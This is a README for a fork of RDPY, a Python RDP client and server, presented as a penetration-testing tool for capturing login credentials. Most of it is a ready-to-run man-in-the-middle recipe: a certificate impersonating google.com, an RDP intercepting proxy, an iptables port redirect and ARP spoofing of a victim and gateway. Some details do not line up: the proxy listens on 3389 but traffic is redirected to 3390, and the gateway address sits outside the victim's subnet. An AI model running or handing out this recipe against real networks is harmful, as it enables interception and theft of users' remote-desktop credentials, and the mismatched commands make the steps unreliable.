# RDPY [![Build Status](https://travis-ci.org/citronneur/rdpy.svg?branch=dev)](https://travis-ci.org/citronneur/rdpy) [![PyPI version](https://badge.fury.io/py/rdpy.png)](http://badge.fury.io/py/rdpy)

Remote Desktop Protocol in twisted python.

RDPY is a pure Python implementation of the Microsoft RDP (Remote Desktop Protocol) protocol (client and server side). RDPY is built over the event driven network engine Twisted. RDPY support standard RDP security layer, RDP over SSL and NLA authentication (through ntlmv2 authentication protocol).
  
This is a branch from the original version of RDPY. It is meant to be used by  penetration testers to capture login credentials in an internal penetration test.   
This is still a work in progress
    
Basic steps for using rdpy-rdpmitm.py  
```  
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout mysitename.key -out mysitename.crt -subj '/C=US/ST=Oregon/L=Portland/CN=www.google.com’
rdpy-rdpmitm.py -o /tmp -l 3389 -k mysitename.key -c mysitename.crt -r x.x.x.x:3389
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 3389 -j REDIRECT --to-port 3390
arpspoof -i eth0 -t 172.16.173.132 162.16.173.2 
```
